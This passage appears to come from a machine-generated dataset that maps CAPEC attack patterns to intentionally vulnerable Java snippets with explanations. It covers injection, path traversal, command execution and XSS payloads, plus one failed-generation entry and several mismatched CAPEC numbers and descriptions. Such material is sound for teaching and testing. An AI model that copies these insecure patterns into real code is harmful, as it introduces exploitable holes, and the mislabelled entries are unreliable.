        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class VulnerableCodeDownloader {\n    public static void main(String[] args) {\n        try {\n            URL url = new URL(\"http://example.com/update.jar\"); // CWE-319: Cleartext Transmission of Sensitive Information\n            HttpURLConnection connection = (HttpURLConnection) url.openConnection();\n            InputStream inputStream = connection.getInputStream();\n            FileOutputStream outputStream = new FileOutputStream(\"update.jar\");\n\n            byte[] buffer = new byte[1024];\n            int bytesRead;\n            while ((bytesRead = inputStream.read(buffer)) != -1) {\n                outputStream.write(buffer, 0, bytesRead);\n            }\n\n            inputStream.close();\n            outputStream.close();\n\n            // CWE-494: Download of Code Without Integrity Check\n            Runtime.getRuntime().exec(\"java -jar update.jar\");\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable code downloader that embodies the main idea of CAPEC-192: Sniff Application Code. The code downloads an update file from a remote server over HTTP (CWE-319: Cleartext Transmission of Sensitive Information) and executes it without performing any integrity checks (CWE-494: Download of Code Without Integrity Check). This lack of encryption and integrity verification makes the code susceptible to interception and tampering by an adversary, who could then exploit the trust relationship between the client and server."
    },
    {
        "capec_id": "66",
        "capec_name": "SQL Injection",
        "code_snippet": "import java.sql.Connection;\nimport java.sql.DriverManager;\nimport java.sql.ResultSet;\nimport java.sql.SQLException;\nimport java.sql.Statement;\n\npublic class SQLInjectionExample {\n    public static void main(String[] args) {\n        String userInput = \"' OR '1'='1\"; // Malicious input\n        String query = \"SELECT * FROM users WHERE username = '\" + userInput + \"'\";\n\n        try (Connection connection = DriverManager.getConnection(\"jdbc:mysql://localhost:3306/mydatabase\", \"user\", \"password\");\n             Statement statement = connection.createStatement();\n             ResultSet resultSet = statement.executeQuery(query)) {\n\n            while (resultSet.next()) {\n                System.out.println(\"User: \" + resultSet.getString(\"username\"));\n            }\n        } catch (SQLException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a classic SQL Injection vulnerability. The code constructs an SQL query by directly concatenating user input into the query string without proper validation or neutralization. The user input is crafted to manipulate the SQL query, potentially allowing an attacker to bypass authentication or retrieve all records from the 'users' table. This example embodies the main idea of CAPEC-66 (SQL Injection) and highlights CWE-89 (Improper Neutralization of Special Elements used in an SQL Command), CWE-1286 (Improper Validation of Syntactic Correctness of Input), and CWE-209 (Generation of Error Message Containing Sensitive Information). The code also implicitly touches on CWE-564 (SQL Injection: Hibernate) by demonstrating the risks of dynamic SQL execution, although Hibernate is not used in this specific example."
    },
    {
        "capec_id": "67",
        "capec_name": "String Format Overflow in syslog()",
        "code_snippet": "import java.util.logging.Logger;\n\npublic class VulnerableSyslog {\n    private static final Logger logger = Logger.getLogger(VulnerableSyslog.class.getName());\n\n    public static void logMessage(String userInput) {\n        // CWE-134: Use of Externally-Controlled Format String\n        // CWE-20: Improper Input Validation\n        // CWE-74: Improper Neutralization of Special Elements in Output Used by a Downstream Component\n        // CWE-120: Buffer Copy without Checking Size of Input\n        logger.info(String.format(userInput));\n    }\n\n    public static void main(String[] args) {\n        // Simulate user input\n        String userInput = \"%x %x %x %x\";\n        logMessage(userInput);\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerability related to the misuse of format strings in logging functions, specifically mimicking the behavior of the syslog() function in C. The `logMessage` method takes user input and directly uses it as a format string in the `String.format` method, which is then logged using `Logger.info`. This can lead to a format string injection attack (CWE-134), where an attacker can inject malicious format specifiers. The code also lacks proper input validation (CWE-20) and does not neutralize special elements (CWE-74), potentially leading to buffer overflow (CWE-120) and other security issues. The `main` method simulates user input that could exploit this vulnerability."
    },
    {
        "capec_id": "68",
        "capec_name": "Subvert Code-signing Facilities",
        "code_snippet": "import java.security.*;\nimport java.util.Base64;\n\npublic class CodeSigningExample {\n    public static void main(String[] args) throws Exception {\n        String data = \"Sensitive Data\";\n        KeyPairGenerator keyGen = KeyPairGenerator.getInstance(\"RSA\");\n        keyGen.initialize(2048);\n        KeyPair pair = keyGen.generateKeyPair();\n        PrivateKey privateKey = pair.getPrivate();\n        PublicKey publicKey = pair.getPublic();\n\n        // Sign the data\n        Signature signature = Signature.getInstance(\"SHA1withRSA\"); // CWE-328: Use of Weak Hash\n        signature.initSign(privateKey);\n        signature.update(data.getBytes());\n        byte[] signedData = signature.sign();\n        System.out.println(\"Signed Data: \" + Base64.getEncoder().encodeToString(signedData));\n\n        // Verify the signature\n        signature.initVerify(publicKey);\n        signature.update(data.getBytes());\n        boolean isVerified = signature.verify(signedData);\n        System.out.println(\"Signature Verified: \" + isVerified);\n    }\n}",
        "description": "This Java code snippet demonstrates a basic example of code signing and verification using RSA. The code generates a key pair, signs a piece of data with the private key, and then verifies the signature with the public key. However, it uses the SHA1withRSA algorithm, which is considered weak (CWE-328: Use of Weak Hash). This weakness can be exploited by an attacker to subvert the code-signing mechanism, potentially leading to privilege escalation as described in the CAPEC. The use of a weak hash function makes the signed data vulnerable to preimage, second preimage, and birthday attacks, undermining the integrity of the code-signing process."
    },
    {
        "capec_id": "69",
        "capec_name": "Target Programs with Elevated Privileges",
        "code_snippet": "import java.io.BufferedReader;\nimport java.io.InputStreamReader;\n\npublic class PrivilegedCommandExecutor {\n    public static void main(String[] args) {\n        try {\n            // CWE-250: Execution with Unnecessary Privileges\n            if (args.length > 0 && args[0].equals(\"admin\")) {\n                // CWE-15: External Control of System or Configuration Setting\n                String command = args[1];\n                // CWE-78: Improper Neutralization of Special Elements used in an OS Command\n                Process process = Runtime.getRuntime().exec(command);\n                BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));\n                String line;\n                while ((line = reader.readLine()) != null) {\n                    System.out.println(line);\n                }\n                process.waitFor();\n            } else {\n                System.out.println(\"Insufficient privileges.\");\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a program that executes commands with elevated privileges if the first argument is 'admin'. It embodies the CAPEC 'Target Programs with Elevated Privileges' by allowing an attacker to execute arbitrary commands with elevated privileges. The code is vulnerable to several CWEs: CWE-250 (Execution with Unnecessary Privileges) as it runs commands with admin privileges unnecessarily, CWE-15 (External Control of System or Configuration Setting) as it allows external input to control the command execution, and CWE-78 (Improper Neutralization of Special Elements used in an OS Command) as it directly uses user input to construct and execute OS commands without proper sanitization. This can lead to OS command injection attacks."
    },
    {
        "capec_id": "70",
        "capec_name": "Try Common or Default Usernames and Passwords",
        "code_snippet": "import java.util.HashMap;\nimport java.util.Map;\n\npublic class VulnerableLogin {\n    private static final Map<String, String> users = new HashMap<>();\n    \n    static {\n        // CWE-798: Use of Hard-coded Credentials\n        users.put(\"admin\", \"admin\"); // Default credentials\n        users.put(\"user\", \"password\"); // Weak password\n    }\n    \n    public static boolean login(String username, String password) {\n        // CWE-521: Weak Password Requirements\n        if (users.containsKey(username) && users.get(username).equals(password)) {\n            return true;\n        }\n        return false;\n    }\n    \n    public static void main(String[] args) {\n        // Example login attempts\n        System.out.println(login(\"admin\", \"admin\")); // True\n        System.out.println(login(\"user\", \"password\")); // True\n        System.out.println(login(\"user\", \"1234\")); // False\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable login system that embodies the main idea of CAPEC-111: 'Try Common or Default Usernames and Passwords'. The code includes hard-coded credentials (CWE-798) and weak password requirements (CWE-521). The static block initializes a map with default usernames and passwords, which are common and weak. The login method checks if the provided username and password match any entry in the map, representing a system that could be easily compromised by an attacker using common or default credentials. This example highlights the importance of removing default credentials and enforcing strong password policies."
    },
    {
        "capec_id": "71",
        "capec_name": "Using Unicode Encoding to Bypass Validation Logic",
        "code_snippet": "import java.nio.charset.StandardCharsets;\nimport java.util.regex.Pattern;\n\npublic class UnicodeValidationBypass {\n    public static void main(String[] args) {\n        String userInput = \"\\u003Cscript\\u003Ealert('XSS')\\u003C/script\\u003E\";\n        if (isValidInput(userInput)) {\n            System.out.println(\"Input is valid: \" + userInput);\n        } else {\n            System.out.println(\"Input is invalid\");\n        }\n    }\n\n    public static boolean isValidInput(String input) {\n        // Early validation before canonicalization\n        if (!Pattern.matches(\"^[a-zA-Z0-9]*$\", input)) {\n            return false;\n        }\n        // Canonicalize the input\n        String canonicalInput = new String(input.getBytes(StandardCharsets.UTF_8), StandardCharsets.UTF_8);\n        // Validate again after canonicalization\n        return Pattern.matches(\"^[a-zA-Z0-9]*$\", canonicalInput);\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerability where Unicode encoding can be used to bypass validation logic. The `isValidInput` method first validates the input using a regex pattern before canonicalizing it. This early validation can be bypassed if the input contains Unicode-encoded characters that are not properly handled. After canonicalization, the input is validated again, but by this time, the malicious input may have already bypassed the initial validation. This example embodies the CAPEC idea of using Unicode encoding to bypass validation logic and highlights related CWEs such as improper handling of Unicode encoding (CWE-176), early validation (CWE-179), and improper input validation (CWE-20)."
    },
    {
        "capec_id": "72",
        "capec_name": "URL Encoding",
        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class URLDecoderExample {\n    public static void main(String[] args) {\n        try {\n            String encodedUrl = \"%2E%2E%2F%2E%2E%2Fetc%2Fpasswd\"; // Encoded URL representing '../../etc/passwd'\n            String decodedUrl = URLDecoder.decode(encodedUrl, \"UTF-8\");\n            System.out.println(\"Decoded URL: \" + decodedUrl);\n\n            // Vulnerable file access based on decoded URL\n            File file = new File(decodedUrl);\n            BufferedReader reader = new BufferedReader(new FileReader(file));\n            String line;\n            while ((line = reader.readLine()) != null) {\n                System.out.println(line);\n            }\n            reader.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerability related to improper handling of URL encoding. The encoded URL '%2E%2E%2F%2E%2E%2Fetc%2Fpasswd' is decoded to '../../etc/passwd', which is then used to access the file system. This represents CWE-173 (Improper Handling of Alternate Encoding) and CWE-177 (Improper Handling of URL Encoding). The code also exemplifies CWE-73 (External Control of File Name or Path) as it allows user input to control the file path, and CWE-20 (Improper Input Validation) as it does not validate the decoded URL. This can lead to directory traversal attacks, where an attacker can access sensitive files on the server."
    },
    {
        "capec_id": "73",
        "capec_name": "User-Controlled Filename",
        "code_snippet": "import java.io.*;\nimport javax.servlet.*;\nimport javax.servlet.http.*;\n\npublic class FileUploadServlet extends HttpServlet {\n    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        String fileName = request.getParameter(\"fileName\");\n        Part filePart = request.getPart(\"file\");\n\n        // Vulnerable code: No validation or sanitization of the fileName\n        File file = new File(\"/uploads/\" + fileName);\n        try (InputStream fileContent = filePart.getInputStream();\n             FileOutputStream fos = new FileOutputStream(file)) {\n            byte[] buffer = new byte[1024];\n            int bytesRead;\n            while ((bytesRead = fileContent.read(buffer)) != -1) {\n                fos.write(buffer, 0, bytesRead);\n            }\n        }\n\n        // Vulnerable code: Directly using the fileName in HTML response\n        response.setContentType(\"text/html\");\n        PrintWriter out = response.getWriter();\n        out.println(\"<html><body>\");\n        out.println(\"File \" + fileName + \" uploaded successfully.\");\n        out.println(\"</body></html>\");\n    }\n}",
        "description": "This Java servlet code snippet demonstrates a vulnerability where user-controlled input (the file name) is not properly validated or sanitized before being used. The file name is directly taken from the user input and used to create a file path, which can lead to directory traversal attacks. Additionally, the file name is directly embedded into an HTML response without proper encoding, making it susceptible to XSS attacks. This code embodies the main idea of the CAPEC 'User-Controlled Filename' and highlights related CWEs such as 'Improper Input Validation' (CWE-20), 'Improper Neutralization of Directives in Statically Saved Code' (CWE-96), and 'Improper Encoding or Escaping of Output' (CWE-116)."
    },
    {
        "capec_id": "74",
        "capec_name": "Manipulating State",
        "code_snippet": "import javax.servlet.http.Cookie;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\nimport java.io.IOException;\n\npublic class StateManipulationExample {\n    public void handleRequest(HttpServletRequest request, HttpServletResponse response) throws IOException {\n        // CWE-315: Cleartext Storage of Sensitive Information in a Cookie\n        Cookie[] cookies = request.getCookies();\n        String userRole = \"guest\";\n        if (cookies != null) {\n            for (Cookie cookie : cookies) {\n                if (cookie.getName().equals(\"userRole\")) {\n                    userRole = cookie.getValue();\n                }\n            }\n        }\n\n        // CWE-372: Incomplete Internal State Distinction\n        if (userRole.equals(\"admin\")) {\n            // Perform admin-specific operations\n            response.getWriter().write(\"Welcome, Admin!\");\n        } else {\n            // Perform guest-specific operations\n            response.getWriter().write(\"Welcome, Guest!\");\n        }\n    }\n\n    public void setAdminRole(HttpServletResponse response) {\n        // CWE-315: Cleartext Storage of Sensitive Information in a Cookie\n        Cookie adminCookie = new Cookie(\"userRole\", \"admin\");\n        response.addCookie(adminCookie);\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerability related to the CAPEC 'Manipulating State' by showing how an attacker can manipulate user state information stored in cookies. The code includes CWE-315 (Cleartext Storage of Sensitive Information in a Cookie) by storing the user role in a cookie without encryption. It also demonstrates CWE-372 (Incomplete Internal State Distinction) by making security decisions based on the user role stored in the cookie. An attacker could manipulate the cookie to elevate their privileges to 'admin' and gain unauthorized access to admin-specific operations."
    },
    {
        "capec_id": "75",
        "capec_name": "Manipulating Writeable Configuration Files",
        "code_snippet": "import java.io.*;\nimport java.util.Properties;\n\npublic class ConfigManager {\n    private Properties config;\n    private File configFile;\n\n    public ConfigManager(String filePath) throws IOException {\n        configFile = new File(filePath);\n        config = new Properties();\n        loadConfig();\n    }\n\n    private void loadConfig() throws IOException {\n        try (FileInputStream fis = new FileInputStream(configFile)) {\n            config.load(fis);\n        }\n    }\n\n    public String getConfigValue(String key) {\n        return config.getProperty(key);\n    }\n\n    public void setConfigValue(String key, String value) throws IOException {\n        config.setProperty(key, value);\n        saveConfig();\n    }\n\n    private void saveConfig() throws IOException {\n        try (FileOutputStream fos = new FileOutputStream(configFile)) {\n            config.store(fos, null);\n        }\n    }\n\n    public static void main(String[] args) {\n        try {\n            ConfigManager manager = new ConfigManager(\"config.properties\");\n            manager.setConfigValue(\"username\", \"admin\");\n            System.out.println(\"Username: \" + manager.getConfigValue(\"username\"));\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a simple configuration manager that reads from and writes to a configuration file. The `ConfigManager` class loads properties from a file, allows retrieval and modification of these properties, and saves the changes back to the file. This embodies the CAPEC concept of 'Manipulating Writeable Configuration Files' by showing how an attacker could potentially modify configuration settings if they have write access to the configuration file. The code does not include any integrity checks (CWE-353, CWE-354), origin validation (CWE-346), or proper control of resource identifiers (CWE-99), making it vulnerable to various attacks such as command injection (CWE-77) if the configuration values are used in system commands."
    },
    {
        "capec_id": "76",
        "capec_name": "Manipulating Web Input to File System Calls",
        "code_snippet": "import java.io.*;\nimport javax.servlet.*;\nimport javax.servlet.http.*;\n\npublic class FileServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        String fileName = request.getParameter(\"file\");\n        File file = new File(\"/var/www/uploads/\" + fileName);\n        \n        if (file.exists() && !file.isDirectory()) {\n            FileInputStream fis = new FileInputStream(file);\n            response.setContentType(\"application/octet-stream\");\n            response.setHeader(\"Content-Disposition\", \"attachment; filename=\" + fileName);\n            \n            OutputStream os = response.getOutputStream();\n            byte[] buffer = new byte[1024];\n            int bytesRead;\n            while ((bytesRead = fis.read(buffer)) != -1) {\n                os.write(buffer, 0, bytesRead);\n            }\n            fis.close();\n            os.close();\n        } else {\n            response.sendError(HttpServletResponse.SC_NOT_FOUND);\n        }\n    }\n}",
        "description": "This Java servlet code snippet demonstrates a vulnerability related to 'Manipulating Web Input to File System Calls'. The code takes a 'file' parameter from an HTTP GET request and uses it to construct a file path. It then attempts to serve the file to the client if it exists. This code is vulnerable to several CWE issues:\n\n1. **CWE-23 (Relative Path Traversal)**: The 'fileName' parameter is not properly sanitized, allowing an attacker to use sequences like '../' to access files outside the intended directory.\n2. **CWE-22 (Path Traversal)**: Similar to CWE-23, the code does not neutralize special elements in the 'fileName' parameter, potentially allowing access to restricted directories.\n3. **CWE-73 (External Control of File Name or Path)**: The file path is directly influenced by user input, which can be exploited to access unintended files.\n4. **CWE-77 (Command Injection)**: Although not directly shown, improper handling of the 'fileName' parameter could lead to command injection if used in system commands.\n5. **CWE-285 (Improper Authorization)**: The code does not perform any authorization checks to ensure the requesting user has permission to access the requested file.\n\nThis code snippet represents the main idea of the CAPEC by showing how manipulating web input can lead to unintended file system access."
    },
    {
        "capec_id": "77",
        "capec_name": "Manipulating User-Controlled Variables",
        "code_snippet": "import java.util.HashMap;\nimport java.util.Map;\n\npublic class VulnerableApp {\n    private static Map<String, String> config = new HashMap<>();\n\n    public static void main(String[] args) {\n        // Simulate user input from query parameters\n        String userInput = \"DEBUG=true\";\n        processUserInput(userInput);\n\n        // Business logic that depends on the configuration\n        if (Boolean.parseBoolean(config.getOrDefault(\"DEBUG\", \"false\"))) {\n            System.out.println(\"Debug mode is ON\");\n        } else {\n            System.out.println(\"Debug mode is OFF\");\n        }\n    }\n\n    private static void processUserInput(String input) {\n        // Directly using user input without validation\n        String[] keyValue = input.split(\"=\");\n        if (keyValue.length == 2) {\n            config.put(keyValue[0], keyValue[1]);\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerability where user-controlled variables can manipulate the application's configuration settings. The `processUserInput` method directly uses user input to modify the application's configuration without any validation or sanitization. This can lead to an attacker changing critical settings, such as enabling debug mode, which can expose sensitive information or alter the application's behavior. This example embodies the main idea of CAPEC-15 and related CWEs, particularly CWE-15 (External Control of System or Configuration Setting) and CWE-473 (PHP External Variable Modification), by showing how untrusted input can directly influence application logic."
    },
    {
        "capec_id": "78",
        "capec_name": "Using Escaped Slashes in Alternate Encoding",
        "code_snippet": "import java.io.*;\nimport javax.servlet.*;\nimport javax.servlet.http.*;\n\npublic class VulnerableServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        String filePath = request.getParameter(\"file\");\n        \n        // Validate input before canonicalization\n        if (filePath.contains(\"..\")) {\n            response.sendError(HttpServletResponse.SC_BAD_REQUEST, \"Invalid file path\");\n            return;\n        }\n        \n        // Canonicalize the file path\n        File file = new File(filePath);\n        String canonicalPath = file.getCanonicalPath();\n        \n        // Check if the file is within the allowed directory\n        File allowedDir = new File(\"/var/www/html\");\n        if (!canonicalPath.startsWith(allowedDir.getCanonicalPath())) {\n            response.sendError(HttpServletResponse.SC_FORBIDDEN, \"Access denied\");\n            return;\n        }\n        \n        // Read and serve the file\n        try (BufferedReader reader = new BufferedReader(new FileReader(file))) {\n            String line;\n            while ((line = reader.readLine()) != null) {\n                response.getWriter().println(line);\n            }\n        } catch (FileNotFoundException e) {\n            response.sendError(HttpServletResponse.SC_NOT_FOUND, \"File not found\");\n        }\n    }\n}",
        "description": "This Java servlet code snippet demonstrates a vulnerability related to the CAPEC 'Using Escaped Slashes in Alternate Encoding'. The code takes a file path from a user input (HTTP request parameter) and attempts to validate it before canonicalizing it. This is a classic example of CWE-180 (Incorrect Behavior Order: Validate Before Canonicalize). The code first checks for '..' in the file path to prevent directory traversal attacks, but this check is done before the path is canonicalized, which can be bypassed using alternate encodings or escape sequences. After canonicalization, the code checks if the file is within an allowed directory, but by this point, the initial validation may have been bypassed. This can lead to CWE-22 (Path Traversal) and CWE-73 (External Control of File Name or Path) vulnerabilities. The code also demonstrates improper handling of alternate encodings (CWE-173) and improper input validation (CWE-20)."
    },
    {
        "capec_id": "79",
        "capec_name": "Using Slashes in Alternate Encoding",
        "code_snippet": "import java.io.*;\nimport javax.servlet.*;\nimport javax.servlet.http.*;\n\npublic class VulnerableServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        String filePath = request.getParameter(\"file\");\n        \n        // Vulnerable to path traversal due to improper input validation and handling of alternate encoding\n        File file = new File(\"/var/www/html/\" + filePath);\n        \n        if (file.exists() && file.isFile()) {\n            FileInputStream fis = new FileInputStream(file);\n            byte[] data = new byte[(int) file.length()];\n            fis.read(data);\n            fis.close();\n            \n            response.setContentType(\"application/octet-stream\");\n            response.setContentLength(data.length);\n            response.getOutputStream().write(data);\n        } else {\n            response.sendError(HttpServletResponse.SC_NOT_FOUND);\n        }\n    }\n}",
        "description": "This Java servlet code snippet demonstrates a vulnerability related to the CAPEC 'Using Slashes in Alternate Encoding'. The servlet reads a file path from a request parameter and attempts to serve the file from the server's file system. The code is vulnerable to path traversal attacks due to improper input validation (CWE-20) and improper handling of alternate encoding (CWE-173). An attacker could exploit this by providing a file path with encoded slashes or backslashes to access sensitive files outside the intended directory. The code does not neutralize special elements (CWE-74) and allows external control of the file path (CWE-73), leading to potential exposure of sensitive information (CWE-200)."
    },
    {
        "capec_id": "80",
        "capec_name": "Using UTF-8 Encoding to Bypass Validation Logic",
        "code_snippet": "import java.nio.charset.StandardCharsets;\nimport java.nio.charset.Charset;\nimport java.nio.charset.CharsetDecoder;\nimport java.nio.charset.CodingErrorAction;\n\npublic class UTF8ValidationBypass {\n    public static void main(String[] args) {\n        String userInput = \"\\u00C0\\u0080\"; // Overlong encoding for null character\n        if (isValidUTF8(userInput)) {\n            // Improper validation before canonicalization\n            if (userInput.equals(\"\\u0000\")) {\n                System.out.println(\"Input is a null character\");\n            } else {\n                System.out.println(\"Input is not a null character\");\n            }\n        } else {\n            System.out.println(\"Invalid UTF-8 input\");\n        }\n    }\n\n    public static boolean isValidUTF8(String input) {\n        try {\n            byte[] bytes = input.getBytes(StandardCharsets.UTF_8);\n            CharsetDecoder decoder = StandardCharsets.UTF_8.newDecoder();\n            decoder.onMalformedInput(CodingErrorAction.REPORT);\n            decoder.decode(java.nio.ByteBuffer.wrap(bytes));\n            return true;\n        } catch (Exception e) {\n            return false;\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerability where UTF-8 encoding is used to bypass validation logic. The `userInput` string contains an overlong encoding for a null character. The `isValidUTF8` method checks if the input is valid UTF-8, but the validation is done before canonicalization. This means that the overlong encoding is not properly handled, and the input is incorrectly validated as a null character. This represents CWE-180 (Incorrect Behavior Order: Validate Before Canonicalize) and CWE-173 (Improper Handling of Alternate Encoding). The code highlights the risk of improper input validation when dealing with alternate encodings like UTF-8."
    },
    {
        "capec_id": "81",
        "capec_name": "Web Server Logs Tampering",
        "code_snippet": "import java.io.FileWriter;\nimport java.io.IOException;\nimport java.util.logging.Logger;\n\npublic class WebServerLogTampering {\n    private static final Logger logger = Logger.getLogger(WebServerLogTampering.class.getName());\n\n    public static void main(String[] args) {\n        String userInput = \"User input with malicious content\\nInjected log entry\";\n        logUserActivity(userInput);\n    }\n\n    public static void logUserActivity(String userInput) {\n        try (FileWriter fw = new FileWriter(\"webserver.log\", true)) {\n            // CWE-117: Improper Output Neutralization for Logs\n            // CWE-93: Improper Neutralization of CRLF Sequences\n            // CWE-75: Failure to Sanitize Special Elements\n            // CWE-116: Improper Encoding or Escaping of Output\n            String sanitizedInput = userInput.replaceAll(\"[\\r\\n]\", \"_\");\n            fw.write(\"User activity: \" + sanitizedInput + \"\\n\");\n        } catch (IOException e) {\n            logger.severe(\"Failed to write to log file: \" + e.getMessage());\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable logging mechanism that could be exploited for web server log tampering. The `logUserActivity` method writes user input to a log file without proper sanitization, allowing an attacker to inject malicious content into the logs. The code attempts to mitigate this by replacing CRLF sequences with underscores, addressing CWE-117, CWE-93, CWE-75, and CWE-116. However, this simplistic approach may not be sufficient to fully neutralize all potential malicious inputs, highlighting the importance of comprehensive input validation and sanitization."
    },
    {
        "capec_id": "82",
        "capec_name": "DEPRECATED: Violating Implicit Assumptions Regarding XML Content (aka XML Denial of Service (XDoS))",
        "code_snippet": "import javax.xml.parsers.DocumentBuilderFactory;\nimport javax.xml.parsers.DocumentBuilder;\nimport org.w3c.dom.Document;\nimport java.io.StringReader;\nimport javax.xml.XMLConstants;\nimport javax.xml.transform.stream.StreamSource;\nimport javax.xml.validation.SchemaFactory;\nimport javax.xml.validation.Schema;\nimport javax.xml.validation.Validator;\nimport org.xml.sax.SAXException;\nimport java.io.IOException;\n\npublic class VulnerableXMLParser {\n    public static void main(String[] args) {\n        String xmlData = \"<?xml version=\\\"1.0\\\"?>\\n\" +\n                         \"<!DOCTYPE root [\\n\" +\n                         \"<!ENTITY lol 'lol'>\\n\" +\n                         \"<!ENTITY lol2 '&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;'>\\n\" +\n                         \"]>\\n\" +\n                         \"<root>&lol2;</root>\";\n\n        try {\n            DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();\n            factory.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, false); // Vulnerability: Improper Restriction of Recursive Entity References\n            DocumentBuilder builder = factory.newDocumentBuilder();\n            Document doc = builder.parse(new InputSource(new StringReader(xmlData)));\n            System.out.println(\"Parsed XML: \" + doc.getDocumentElement().getTextContent());\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerability related to XML processing, specifically improper restriction of recursive entity references (CWE-776). The code parses an XML string that includes a Document Type Definition (DTD) with recursive entity definitions. The `setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, false)` line disables secure processing, making the application vulnerable to XML Entity Expansion attacks (also known as Billion Laughs attack). This can lead to denial of service (DoS) by exhausting system resources. The code embodies the main idea of the deprecated CAPEC, which involves violating implicit assumptions regarding XML content, leading to potential XML Denial of Service (XDoS)."
    },
    {
        "capec_id": "83",
        "capec_name": "XPath Injection",
        "code_snippet": "User intervention needed!",
        "description": "The model failed to generate a description for this code snippet. Error: Failed to parse CodeSnippet from completion {\"code_snippet\": \"import javax.xml.xpath.*;\\nimport org.xml.sax.InputSource;\\nimport java.io.StringReader;\\n\\npublic class XPathInjectionExample {\\n    public static void main(String[] args) throws Exception {\\n        String userInput = \\\"' or '1'='1\\\"; // Simulated malicious input\\n        String xmlData = \\\"<users><user><username>admin</username><password>admin</password></user></users>\\\";\\n\\n        // Vulnerable code: user input is directly used in XPath expression\\n        XPathFactory xPathFactory = XPathFactory.newInstance();\\n        XPath xPath = xPathFactory.newXPath();\\n        String expression = \\\"/users/user[username/text()='\"}. Got: 1 validation error for CodeSnippet\ndescription\n  field required (type=value_error.missing)"
    },
    {
        "capec_id": "84",
        "capec_name": "XQuery Injection",
        "code_snippet": "import javax.xml.xquery.XQConnection;\nimport javax.xml.xquery.XQDataSource;\nimport javax.xml.xquery.XQException;\nimport javax.xml.xquery.XQPreparedExpression;\nimport javax.xml.xquery.XQResultSequence;\nimport net.xqj.exist.ExistXQDataSource;\n\npublic class XQueryInjectionExample {\n    public static void main(String[] args) {\n        String userInput = \"' or '1'='1\"; // Simulated malicious input\n        String xquery = \"for $user in doc('users.xml')/users/user where $user/name = '\" + userInput + \"' return $user\";\n\n        try {\n            XQDataSource xqs = new ExistXQDataSource();\n            XQConnection conn = xqs.getConnection();\n            XQPreparedExpression exp = conn.prepareExpression(xquery);\n            XQResultSequence result = exp.executeQuery();\n\n            while (result.next()) {\n                System.out.println(result.getItemAsString(null));\n            }\n\n            conn.close();\n        } catch (XQException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a basic example of an XQuery Injection vulnerability. The code constructs an XQuery expression using unvalidated user input, which is then executed against an XML database. The user input is directly concatenated into the XQuery string, allowing an attacker to manipulate the query structure. In this example, the input ' or '1'='1 is used to demonstrate how an attacker could potentially bypass authentication or retrieve unauthorized data. This code embodies the main idea of CAPEC-74 and related CWEs, highlighting the risks of improper neutralization of special elements in XQuery expressions."
    },
    {
        "capec_id": "85",
        "capec_name": "AJAX Footprinting",
        "code_snippet": "import javax.servlet.http.*;\nimport java.io.IOException;\n\npublic class VulnerableAjaxServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {\n        String param = request.getParameter(\"input\");\n        // CWE-20: Improper Input Validation\n        if (param == null || param.isEmpty()) {\n            response.getWriter().write(\"Invalid input\");\n            return;\n        }\n        // CWE-79: Cross-Site Scripting (XSS)\n        response.getWriter().write(\"<html><body>\" + param + \"</body></html>\");\n    }\n\n    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws IOException {\n        String param = request.getParameter(\"input\");\n        // CWE-116: Improper Encoding or Escaping of Output\n        response.setHeader(\"X-Custom-Header\", param);\n    }\n}",
        "description": "This Java servlet code demonstrates vulnerabilities related to AJAX footprinting and several CWEs. The `doGet` method improperly validates input (CWE-20) and directly includes user input in the HTML response without sanitization, leading to potential XSS attacks (CWE-79). The `doPost` method sets an HTTP header with user input without proper encoding or escaping (CWE-116), which can lead to HTTP response splitting attacks (CWE-113). This code snippet embodies the main idea of AJAX footprinting by showing how frequent client-server interactions can be exploited to identify and leverage these vulnerabilities."
    },
    {
        "capec_id": "86",
        "capec_name": "XSS Through HTTP Headers",
        "code_snippet": "import javax.servlet.http.*;\nimport java.io.IOException;\n\npublic class VulnerableServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {\n        String referer = request.getHeader(\"Referer\");\n        response.setContentType(\"text/html\");\n        response.getWriter().println(\"<html><body>\");\n        response.getWriter().println(\"<a href='\" + referer + \"'>Click here</a>\");\n        response.getWriter().println(\"</body></html>\");\n    }\n}",
